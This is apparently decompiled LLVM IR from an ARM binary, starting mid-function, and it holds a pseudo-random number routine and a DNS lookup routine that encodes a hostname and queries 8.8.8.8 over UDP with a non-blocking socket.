  store i32 %v3_f774, i32* %stack_var_-28, align 4
  %v0_f778 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f778, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_f770, 1
  br i1 %tmp16, label %dec_label_pc_f820, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f770
  store i32 ptrtoint (i32* @global_var_223b0.170 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ac.174 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a8.172 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a4.168 to i32), i32* %r6.global-to-local, align 4
  %v2_f790 = load i32, i32* @global_var_223b0.170, align 4
  store i32 %v2_f790, i32* %lr.global-to-local, align 4
  %v2_f794 = load i32, i32* @global_var_223ac.174, align 4
  store i32 %v2_f794, i32* %r4.global-to-local, align 4
  %v2_f798 = load i32, i32* @global_var_223a8.172, align 4
  store i32 %v2_f798, i32* %r0.global-to-local, align 4
  %v2_f79c = load i32, i32* @global_var_223a4.168, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f7e0
  %v1_f7a4 = trunc i32 %v5_f7d0 to i16
  %v3_f7a4 = inttoptr i32 %v9_f7d4 to i16*
  store i16 %v1_f7a4, i16* %v3_f7a4, align 2
  %v4_f7a4 = load i32, i32* %r5.global-to-local, align 4
  %v5_f7a4 = add i32 %v4_f7a4, -2
  store i32 %v5_f7a4, i32* %r5.global-to-local, align 4
  %v0_f7a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %.thread, %dec_label_pc_f7a4
  %v0_f7a8 = phi i32 [ %v9_f7d8, %.thread ], [ %v0_f7a8.pre, %dec_label_pc_f7a4 ]
  %v2_f7a45 = phi i32 [ %v12_f7d4, %.thread ], [ %v5_f7a4, %dec_label_pc_f7a4 ]
  %tmp17 = icmp slt i32 %v0_f7a8, 1
  br i1 %tmp17, label %dec_label_pc_f828, label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7a8
  %v0_f7ac = load i32, i32* %r0.global-to-local, align 4
  %v0_f7b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f7b4, i32* %r0.global-to-local, align 4
  %v0_f7b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f7b8, i32* %r4.global-to-local, align 4
  %v0_f7bc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f7bc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f780, %dec_label_pc_f7b4
  %v0_f80c = phi i32 [ %v2_f798, %dec_label_pc_f780 ], [ %v0_f7b4, %dec_label_pc_f7b4 ]
  %v9_f7d4 = phi i32 [ %v0_f778, %dec_label_pc_f780 ], [ %v2_f7a45, %dec_label_pc_f7b4 ]
  %v0_f7ec = phi i32 [ %v0_f770, %dec_label_pc_f780 ], [ %v0_f7a8, %dec_label_pc_f7b4 ]
  %v0_f800 = phi i32 [ %v2_f790, %dec_label_pc_f780 ], [ %v0_f7bc, %dec_label_pc_f7b4 ]
  %v0_f7fc = phi i32 [ %v2_f79c, %dec_label_pc_f780 ], [ %v0_f7ac, %dec_label_pc_f7b4 ]
  %v4_f7c0 = mul i32 %v0_f7fc, 2048
  %v5_f7c0 = xor i32 %v4_f7c0, %v0_f7fc
  %v4_f7c4 = udiv i32 %v0_f800, 524288
  %v5_f7c4 = xor i32 %v4_f7c4, %v0_f800
  %v2_f7c8 = xor i32 %v5_f7c4, %v5_f7c0
  %v4_f7d0 = udiv i32 %v5_f7c0, 256
  %v5_f7d0 = xor i32 %v2_f7c8, %v4_f7d0
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v7_f7d4 = icmp sgt i32 %v0_f7ec, 3
  br i1 %v7_f7d4, label %.thread, label %dec_label_pc_f7e0

.thread:                                          ; preds = %dec_label_pc_f7c0
  %v10_f7d4 = inttoptr i32 %v9_f7d4 to i32*
  store i32 %v5_f7d0, i32* %v10_f7d4, align 4
  %v11_f7d4 = load i32, i32* %r5.global-to-local, align 4
  %v12_f7d4 = add i32 %v11_f7d4, 4
  store i32 %v12_f7d4, i32* %r5.global-to-local, align 4
  %v8_f7d8 = load i32, i32* %r1.global-to-local, align 4
  %v9_f7d8 = add i32 %v8_f7d8, -4
  store i32 %v9_f7d8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f7c0
  %v7_f7ec = icmp eq i32 %v0_f7ec, 1
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v1_f7f4 = add i32 %v0_f7ec, -2
  store i32 %v1_f7f4, i32* %r1.global-to-local, align 4
  br i1 %v7_f7ec, label %dec_label_pc_f7fc, label %dec_label_pc_f7a4

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f7e0
  store i32 %v5_f7d0, i32* %r3.global-to-local, align 4
  %v1_f80c = load i32, i32* %r6.global-to-local, align 4
  %v2_f80c = inttoptr i32 %v1_f80c to i32*
  store i32 %v0_f80c, i32* %v2_f80c, align 4
  %v0_f810 = load i32, i32* %r4.global-to-local, align 4
  %v1_f810 = load i32, i32* %r7.global-to-local, align 4
  %v2_f810 = inttoptr i32 %v1_f810 to i32*
  store i32 %v0_f810, i32* %v2_f810, align 4
  %v0_f814 = load i32, i32* %lr.global-to-local, align 4
  %v1_f814 = load i32, i32* %r8.global-to-local, align 4
  %v2_f814 = inttoptr i32 %v1_f814 to i32*
  store i32 %v0_f814, i32* %v2_f814, align 4
  %v0_f818 = load i32, i32* %r3.global-to-local, align 4
  %v1_f818 = load i32, i32* %sl.global-to-local, align 4
  %v2_f818 = inttoptr i32 %v1_f818 to i32*
  store i32 %v0_f818, i32* %v2_f818, align 4
  %v0_f81c = load i32, i32* %r3.global-to-local, align 4
  %v1_f81c = trunc i32 %v0_f81c to i8
  %v2_f81c = load i32, i32* %r5.global-to-local, align 4
  %v3_f81c = inttoptr i32 %v2_f81c to i8*
  store i8 %v1_f81c, i8* %v3_f81c, align 1
  br label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f770, %dec_label_pc_f828, %dec_label_pc_f7fc
  %v2_f820 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_f820, i32* @r4, align 4
  %v1_f824 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f824

dec_label_pc_f828:                                ; preds = %dec_label_pc_f7a8
  %v0_f828 = load i32, i32* %r3.global-to-local, align 4
  %v1_f828 = load i32, i32* %sl.global-to-local, align 4
  %v2_f828 = inttoptr i32 %v1_f828 to i32*
  store i32 %v0_f828, i32* %v2_f828, align 4
  %v0_f82c = load i32, i32* %lr.global-to-local, align 4
  %v1_f82c = load i32, i32* %r8.global-to-local, align 4
  %v2_f82c = inttoptr i32 %v1_f82c to i32*
  store i32 %v0_f82c, i32* %v2_f82c, align 4
  %v0_f830 = load i32, i32* %r4.global-to-local, align 4
  %v1_f830 = load i32, i32* %r7.global-to-local, align 4
  %v2_f830 = inttoptr i32 %v1_f830 to i32*
  store i32 %v0_f830, i32* %v2_f830, align 4
  %v0_f834 = load i32, i32* %r0.global-to-local, align 4
  %v1_f834 = load i32, i32* %r6.global-to-local, align 4
  %v2_f834 = inttoptr i32 %v1_f834 to i32*
  store i32 %v0_f834, i32* %v2_f834, align 4
  br label %dec_label_pc_f820

; uselistorder directives
  uselistorder i32 %v9_f7d8, { 1, 0 }
  uselistorder i32 %v12_f7d4, { 1, 0 }
  uselistorder i32 %v5_f7d0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_f7fc, { 1, 0 }
  uselistorder i32 %v0_f800, { 1, 0 }
  uselistorder i32 %v0_f7ec, { 1, 0, 2 }
  uselistorder i32 %v0_f7a8, { 1, 0 }
  uselistorder i32 %v0_f770, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_223a4.168, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_223a8.172, { 2, 3, 4, 1, 6, 0, 5 }
  uselistorder i32* @global_var_223ac.174, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_223b0.170, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f820, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f7c0, { 1, 0 }
}

define i32 @function_f84c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f84c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f84c = load i32, i32* @r4, align 4
  store i32 %v3_f84c, i32* %stack_var_-8, align 4
  %v6_f84c = load i32, i32* @lr, align 4
  %v0_f850 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f850, i32* @r4, align 4
  %v2_f850 = icmp eq i32 %v0_f850, 0
  br i1 %v2_f850, label %dec_label_pc_f86c, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f84c
  %v1_f858 = add i32 %v0_f850, 4
  %v2_f858 = inttoptr i32 %v1_f858 to i32*
  %v3_f858 = load i32, i32* %v2_f858, align 4
  store i32 %v3_f858, i32* %r0.global-to-local, align 4
  store i32 63588, i32* @lr, align 4
  %v1_f860 = icmp ne i32 %v3_f858, 0
  call void @__pseudo_cond_branch(i1 %v1_f860, i32 ptrtoint (i32* @global_var_137cc.57 to i32))
  %v0_f864 = load i32, i32* @r4, align 4
  store i32 %v0_f864, i32* %r0.global-to-local, align 4
  %v1_f868 = call i32 @function_137cc(i32 %v0_f864)
  store i32 %v1_f868, i32* %r0.global-to-local, align 4
  %v2_f86c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f84c, %dec_label_pc_f858
  %v1_f870 = phi i32 [ 0, %dec_label_pc_f84c ], [ %v1_f868, %dec_label_pc_f858 ]
  %v2_f86c = phi i32 [ %v3_f84c, %dec_label_pc_f84c ], [ %v2_f86c.pre, %dec_label_pc_f858 ]
  store i32 %v2_f86c, i32* @r4, align 4
  store i32 %v6_f84c, i32* @lr, align 4
  ret i32 %v1_f870

; uselistorder directives
  uselistorder i32 %v0_f850, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f86c, { 1, 0 }
}

define i32 @function_f874(i32 %arg1) local_unnamed_addr {
dec_label_pc_f874:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp78 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_f874 = load i32, i32* @r4, align 4
  %v9_f874 = load i32, i32* @r6, align 4
  %v12_f874 = load i32, i32* @r7, align 4
  %v15_f874 = load i32, i32* @r8, align 4
  %v18_f874 = load i32, i32* @sb, align 4
  %v21_f874 = load i32, i32* @sl, align 4
  %v24_f874 = load i32, i32* @fp, align 4
  %v27_f874 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_f88c = call i32 @function_13258(i32 1, i32 8)
  store i32 %v2_f88c, i32* @fp, align 4
  %v0_f894 = load i32, i32* @r5, align 4
  store i32 %v0_f894, i32* %r0.global-to-local, align 4
  %v1_f898 = inttoptr i32 %v0_f894 to i8*
  %v2_f898 = call i32 @function_12370(i8* %v1_f898)
  %v2_f8a0 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_f8a0, i32* @sl, align 4
  %v2_f8a4 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_f8a4, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_f8ac = add i32 %v2_f898, 1
  store i32 %v1_f8ac, i32* %r0.global-to-local, align 4
  %v2_f8b0 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_f8b0, i32* %r2.global-to-local, align 4
  store i32 %v2_f8a4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_f8ac, i32* %r3.global-to-local, align 4
  %v2_f8ec143 = icmp eq i32 %v1_f8ac, 0
  store i1 %v2_f8ec143, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_f8f4144 = add i32 %v2_f8b0, -1
  store i32 %v1_f8f4144, i32* %r1.global-to-local, align 4
  %tmp115145 = icmp slt i32 %v1_f8ac, 1
  br i1 %tmp115145, label %dec_label_pc_f8fc, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %dec_label_pc_f874, %bb114
  %v0_f8c0148 = phi i32 [ %v1_f8e0, %bb114 ], [ 0, %dec_label_pc_f874 ]
  %v1_f8cc147.off0 = phi i8 [ %extract.t149, %bb114 ], [ 0, %dec_label_pc_f874 ]
  %v2_f900146 = phi i32 [ %v1_f8e4, %bb114 ], [ %v2_f8b0, %dec_label_pc_f874 ]
  %v1_f8c0 = load i32, i32* @r5, align 4
  %v2_f8c0 = add i32 %v1_f8c0, %v0_f8c0148
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i8*
  %v4_f8c0 = load i8, i8* %v3_f8c0, align 1
  %v6_f8c0 = zext i8 %v4_f8c0 to i32
  store i32 %v6_f8c0, i32* %r3.global-to-local, align 4
  %v2_f8c4 = icmp eq i8 %v4_f8c0, 0
  store i1 %v2_f8c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8c4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f8c0
  %v8_f8c8 = icmp eq i8 %v4_f8c0, 46
  store i1 %v8_f8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8c8, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_f8c0, %bb
  %v3_f8cc = load i32, i32* %r6.global-to-local, align 4
  %v4_f8cc = inttoptr i32 %v3_f8cc to i8*
  store i8 %v1_f8cc147.off0, i8* %v4_f8cc, align 1
  %v0_f8d0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d0.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_f8d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_f8d0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_f8d0.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_f8d0 = phi i32 [ %v3_f8d0.pre, %.thread..thread7_crit_edge ], [ %v2_f900146, %bb ]
  %v1_f8d0.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_f8c0, %bb ]
  %v4_f8d0 = add i32 %v3_f8d0, -1
  %v5_f8d0 = inttoptr i32 %v4_f8d0 to i8*
  store i8 %v1_f8d0.off0, i8* %v5_f8d0, align 1
  %v0_f8d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d4.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_f8d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f8d4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb114

.thread9:                                         ; preds = %.thread7
  %v1_f8d411 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_f8d411, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb114

.thread12:                                        ; preds = %.thread7
  %v1_f8dc = load i32, i32* @lr, align 4
  %v2_f8dc = urem i32 %v1_f8dc, 256
  store i32 %v2_f8dc, i32* %r4.global-to-local, align 4
  br label %bb114

bb114:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_f8f033 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_f8dc, %.thread12 ]
  %v0_f8e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_f8e0 = add i32 %v0_f8e0, 1
  store i32 %v1_f8e0, i32* %ip.global-to-local, align 4
  %v0_f8e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f8e4 = add i32 %v0_f8e4, 1
  store i32 %v1_f8e4, i32* %r2.global-to-local, align 4
  %v1_f8e8.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_f8e8 = sub i32 %v1_f8e8.pre, %v1_f8e0
  store i32 %v2_f8e8, i32* %r3.global-to-local, align 4
  %v2_f8ec = icmp eq i32 %v2_f8e8, 0
  store i1 %v2_f8ec, i1* %cpsr_z.global-to-local, align 1
  %v1_f8f0 = add nuw nsw i32 %v0_f8f033, 1
  store i32 %v1_f8f0, i32* @lr, align 4
  store i32 %v0_f8e4, i32* %r1.global-to-local, align 4
  %tmp115 = icmp slt i32 %v2_f8e8, 1
  %extract.t149 = trunc i32 %v0_f8f033 to i8
  br i1 %tmp115, label %dec_label_pc_f8fc, label %dec_label_pc_f8c0

dec_label_pc_f8fc:                                ; preds = %bb114, %dec_label_pc_f874
  %v1_f8f4.lcssa = phi i32 [ %v1_f8f4144, %dec_label_pc_f874 ], [ %v0_f8e4, %bb114 ]
  store i32 0, i32* @r4, align 4
  %v4_f900 = inttoptr i32 %v1_f8f4.lcssa to i8*
  store i8 0, i8* %v4_f900, align 1
  store i32 %v2_f8a4, i32* %r0.global-to-local, align 4
  %v1_f908 = bitcast i32* %stack_var_-2232 to i8*
  %v2_f908 = call i32 @function_12370(i8* %v1_f908)
  %v2_f90c = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_f90c, i32* %r1.global-to-local, align 4
  %v1_f910 = load i32, i32* @sb, align 4
  %v2_f910 = add i32 %v1_f910, %v2_f908
  store i32 %v2_f910, i32* %r5.global-to-local, align 4
  %v0_f918 = load i32, i32* @r4, align 4
  store i32 %v0_f918, i32* %stack_var_-68, align 4
  store i32 %v2_f8a4, i32* %r0.global-to-local, align 4
  %v2_f928 = call i32 @function_12370(i8* %v1_f908)
  %v1_f92c = add i32 %v2_f928, 17
  store i32 %v1_f92c, i32* %r0.global-to-local, align 4
  %v0_f934 = call i32 @function_f570()
  %v1_f934 = sext i32 %v0_f934 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_f940 = mul nuw nsw i64 %v1_f934, 2147516417
  %v6_f940 = udiv i64 %v5_f940, 4294967296
  %v7_f940 = trunc i64 %v6_f940 to i32
  %v8_f940 = trunc i64 %v5_f940 to i32
  store i32 %v8_f940, i32* @lr, align 4
  store i32 %v7_f940, i32* %r2.global-to-local, align 4
  %v5_f9444 = udiv i64 %v5_f940, 140737488355328
  %v5_f944 = trunc i64 %v5_f9444 to i32
  %v6_f944 = add i32 %v5_f944, %v0_f934
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_f950 = urem i32 %v6_f944, 65536
  store i32 %v6_f950, i32* %ip.global-to-local, align 4
  %v2_f958 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f958, i32* %r0.global-to-local, align 4
  %v5_f95c = trunc i32 %v6_f944 to i16
  %v2_f960 = call i32 @function_12404(i32 %v2_f958, i32 16)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 134744072, i32* %r0.global-to-local, align 4
  %v1_f97c = call i32 @function_14874(i32 134744072)
  store i32 %v2_f90c, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_f98c = call i32 @function_14898(i32 53)
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  store i16 %v5_f95c, i16* %stack_var_-2244, align 2
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_f9a4 = call i32 @function_14898(i32 256)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9b0 = call i32 @function_14898(i32 1)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9bc = call i32 @function_14898(i32 1)
  %v2_f9bc = trunc i32 %v1_f9bc to i16
  %v3_f9c0 = load i32, i32* %r5.global-to-local, align 4
  %v4_f9c0 = add i32 %v3_f9c0, 1
  %v5_f9c0 = inttoptr i32 %v4_f9c0 to i16*
  store i16 %v2_f9bc, i16* %v5_f9c0, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_f9c8 = call i32 @function_14898(i32 1)
  %v2_f9c8 = trunc i32 %v1_f9c8 to i16
  store i32 %v1_f9c8, i32* %r0.global-to-local, align 4
  %v0_f9cc = load i32, i32* %r5.global-to-local, align 4
  %v1_f9cc = add i32 %v0_f9cc, 1
  store i32 %v1_f9cc, i32* @r5, align 4
  %v4_f9d0 = add i32 %v0_f9cc, 3
  %v5_f9d0 = inttoptr i32 %v4_f9d0 to i16*
  store i16 %v2_f9c8, i16* %v5_f9d0, align 2
  %v2_fa6c = ptrtoint i32* %stack_var_-196 to i32
  %v2_fa90 = ptrtoint i32* %stack_var_-40 to i32
  %v2_fabc = ptrtoint i32* %stack_var_-52 to i32
  %v2_fb00 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_fb94 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_fb9c = bitcast i32* %stack_var_-4280 to i8*
  %v4_fbc0 = zext i16 %tmp78 to i32
  %v2_fbc4 = icmp eq i16 %tmp78, 0
  br label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_fb48, %dec_label_pc_f8fc
  %v1_f9e0 = phi i32 [ -1, %dec_label_pc_f8fc ], [ %v0_f9dc.pre, %dec_label_pc_fb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_f8fc ], [ %v1_fb48, %dec_label_pc_fb48 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_f9dc = icmp eq i32 %v1_f9e0, -1
  store i1 %v7_f9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9dc, label %bb117, label %bb116

bb116:                                            ; preds = %dec_label_pc_f9dc
  store i32 %v1_f9e0, i32* %r0.global-to-local, align 4
  br label %bb117

bb117:                                            ; preds = %dec_label_pc_f9dc, %bb116
  store i32 63976, i32* @lr, align 4
  %v1_f9e4 = xor i1 %v7_f9dc, true
  call void @__pseudo_cond_branch(i1 %v1_f9e4, i32 ptrtoint (i32* @global_var_15b6c.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f9f4 = call i32 @function_14ba0(i32 2, i32 2, i32 0)
  store i32 %v3_f9f4, i32* %r0.global-to-local, align 4
  %v7_f9f8 = icmp eq i32 %v3_f9f4, -1
  store i1 %v7_f9f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f9f4, i32* @r6, align 4
  br i1 %v7_f9f8, label %dec_label_pc_fb88, label %dec_label_pc_fa04

dec_label_pc_fa04:                                ; preds = %bb117
  store i32 %v2_f958, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fa10 = call i32 @function_147e4(i32 %v3_f9f4, i32 %v2_f958, i32 16)
  store i32 %v3_fa10, i32* %r0.global-to-local, align 4
  %v7_fa14 = icmp eq i32 %v3_fa10, -1
  store i1 %v7_fa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa14, label %dec_label_pc_fb50, label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fa04
  %v0_fa1c = load i32, i32* @r6, align 4
  store i32 %v0_fa1c, i32* @r0, align 4
  store i32 %v2_f8a0, i32* @r1, align 4
  store i32 %v1_f92c, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fa2c = call i32 @function_14ac0(i32 %v0_fa1c, i32 %v2_f8a0, i32 %v1_f92c, i32 16384)
  store i32 %v4_fa2c, i32* %r0.global-to-local, align 4
  %v7_fa30 = icmp eq i32 %v4_fa2c, -1
  store i1 %v7_fa30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa30, label %dec_label_pc_fb50, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa1c
  %v0_fa38 = load i32, i32* @r6, align 4
  store i32 %v0_fa38, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_fa44 = call i32 @function_12fb4(i32 3, i32 %v0_fa38, i32 0)
  %v0_fa48 = load i32, i32* @r6, align 4
  store i32 %v0_fa48, i32* %r1.global-to-local, align 4
  %v1_fa4c = or i32 %v3_fa44, 2048
  store i32 %v1_fa4c, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_fa54 = call i32 @function_12fb4(i32 4, i32 %v0_fa48, i32 %v1_fa4c)
  store i32 %v3_fa54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_fa6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa70, %dec_label_pc_fa38
  %v1_fa74 = phi i32 [ %v1_fa78, %dec_label_pc_fa70 ], [ 4, %dec_label_pc_fa38 ]
  store i32 0, i32* @r4, align 4
  %v3_fa74 = add i32 %v1_fa74, %v2_fa6c
  %v4_fa74 = inttoptr i32 %v3_fa74 to i32*
  store i32 0, i32* %v4_fa74, align 4
  %v0_fa78 = load i32, i32* %r3.global-to-local, align 4
  %v1_fa78 = add i32 %v0_fa78, 4
  store i32 %v1_fa78, i32* %r3.global-to-local, align 4
  %v7_fa7c = icmp eq i32 %v1_fa78, 128
  br i1 %v7_fa7c, label %dec_label_pc_fa84, label %dec_label_pc_fa70

dec_label_pc_fa84:                                ; preds = %dec_label_pc_fa70
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fa84 = load i32, i32* @r6, align 4
  %v3_fa84 = udiv i32 %v0_fa84, 32
  %v3_fa8c = mul nuw nsw i32 %v3_fa84, 4
  store i32 %v3_fa8c, i32* %r3.global-to-local, align 4
  store i32 %v2_fa90, i32* %r2.global-to-local, align 4
  %v2_fa94 = add i32 %v3_fa8c, %v2_fa90
  store i32 %v2_fa94, i32* @r5, align 4
  %v1_fa98 = add i32 %v2_fa94, -156
  %v2_fa98 = inttoptr i32 %v1_fa98 to i32*
  %v3_fa98 = load i32, i32* %v2_fa98, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_faa0 = urem i32 %v0_fa84, 32
  store i32 %v1_faa0, i32* @r7, align 4
  %v7_faa4 = shl i32 1, %v1_faa0
  %v8_faa4 = or i32 %v3_fa98, %v7_faa4
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_faa4, i32* %v2_fa98, align 4
  %v0_fab4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fab4, i32* %stack_var_-52, align 4
  store i32 %v2_fabc, i32* @lr, align 4
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  %v0_fac4 = load i32, i32* @r6, align 4
  %v1_fac4 = load i32, i32* %r3.global-to-local, align 4
  %v2_fac4 = add i32 %v1_fac4, %v0_fac4
  store i32 %v2_fac4, i32* %r0.global-to-local, align 4
  %v0_facc = load i32, i32* @r4, align 4
  store i32 %v0_facc, i32* %r2.global-to-local, align 4
  store i32 %v0_facc, i32* %r3.global-to-local, align 4
  %v5_fad8 = call i32 @function_14d24(i32 %v2_fac4, i32 %v2_fa6c, i32 %v0_facc, i32 %v0_facc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_fad8, i32* %r0.global-to-local, align 4
  %v7_fadc = icmp eq i32 %v5_fad8, -1
  store i1 %v7_fadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fadc, label %dec_label_pc_fb60, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %dec_label_pc_fa84
  %v1_fae4 = load i32, i32* @r4, align 4
  %v9_fae4 = icmp eq i32 %v5_fad8, %v1_fae4
  store i1 %v9_fae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fae4, label %dec_label_pc_fb40, label %dec_label_pc_faec

